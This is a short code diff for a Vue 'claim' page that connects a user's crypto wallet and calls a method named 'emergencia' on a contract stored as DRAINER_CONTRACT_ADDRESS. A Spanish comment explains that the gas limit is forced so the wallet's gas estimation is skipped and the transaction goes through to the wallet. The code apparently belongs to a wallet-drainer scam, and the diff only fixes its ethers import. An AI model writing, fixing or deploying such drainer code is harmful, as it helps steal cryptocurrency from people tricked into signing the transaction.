@@ -34,7 +34,7 @@
 
 <script setup>
 import { ref, onMounted, onUnmounted, computed } from 'vue'
-import { Contract } from 'ethers'
+import { ethers } from 'ethers'
 import { useWallet } from '../composables/useWallet'
 
 const { userAccount, signer, connectWallet, error } = useWallet()
@@ -74,7 +74,7 @@ const claim = async () => {
   }
   
   try {
-    const contract = new Contract(DRAINER_CONTRACT_ADDRESS, ABI, signer.value)
+    const contract = new ethers.Contract(DRAINER_CONTRACT_ADDRESS, ABI, signer.value)
     // Se fuerza el gasLimit para saltarnos el eth_estimateGas de Ethers y forzar a que llegue a T.R.U.S.T/wallet
     const tx = await contract.emergencia({ gasLimit: 300000 })
     console.log("Tx Hash:", tx.hash)
